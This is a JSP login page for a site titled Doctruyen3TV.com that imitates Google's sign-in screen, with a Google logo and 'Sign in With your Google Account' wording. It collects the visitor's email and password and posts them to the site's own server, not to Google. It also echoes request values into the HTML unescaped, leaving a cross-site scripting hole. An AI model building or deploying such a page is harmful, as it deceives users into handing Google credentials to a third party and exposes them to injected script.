<%@page import="controller.LogByEmail"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Doctruyen3TV.com</title>
</head>

<link
	href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
	rel="stylesheet"
	integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH"
	crossorigin="anonymous">
<script
	src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"
	integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r"
	crossorigin="anonymous"></script>
<script
	src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.min.js"
	integrity="sha384-0pUGZvbkm6XF6gxjEnlmuGrJXVbNuzT9qBBavbLwCsOGabYfZo0T0to5eqruptLy"
	crossorigin="anonymous"></script>

<link rel="stylesheet" href="css/style.css">

<body>
<%
	String email = request.getAttribute("email")+"";
	email = (email.equals("null"))?"":email;
	String e_email = request.getAttribute("e_email")+"";
	e_email = (e_email.equals("null"))?"":e_email;
%>


	<div class="box mt-0">



		<span class="borderLine"></span>
		<form action="dang-nhap-email" method="post">

			<div class="login-container mt-3">
				<img src="img/google.png" alt="Google" class="logo">
			</div>
			<h2 class="text-center mt-4">Sign in</h2>

			<p class="text-center text-muted">With your Google Account</p>

			<div class="inputBox">
				<input type="text" required="required" name="email" value= "<%=email %>" onkeyup="reChange()"> <span>Email
					or phone</span> <i></i>
			</div>

			<div class="inputBox">
				<input type="password" required="required" name="password" onkeyup="reChange()">
				<span>Password</span> <i></i>
			</div>
			<div style="color: red; font-size: small;" id="error" ><%=e_email %></div>

			<div class="links">
				<a href="#">Forgot password?</a>
			</div>

			<div class="d-flex justify-content-between align-items-center mt-3">

				<a
					href="https://accounts.google.com/lifecycle/steps/signup/name?continue=https://myaccount.google.com?utm_source%3Daccount-marketing-page%26utm_medium%3Dcreate-account-button&ddm=0&dsh=S1292676013:1726713895561473&flowEntry=SignUp&flowName=GlifWebSignIn&TL=APps6eadN4-otZCatMbtwNdnrhWpmCQqE8gSKdlJRGVdFf2YVkQTS5tqCCw8mmos"
					class="text-start">Create account</a> <input type="submit"
					value="Login" class="btn btn-primary">
			</div>
		</form>
	</div>

	<!-- Các liên kết nằm ngang dưới khung box -->
	<div class="footer-links mt-4">
		<a href="#">Help</a> <a href="#">Privacy Policy</a> <a href="#">Terms
			of Service</a>
	</div>
	<script type="text/javascript" src="javascript/script.js" defer="defer"></script>
</body>
</html>
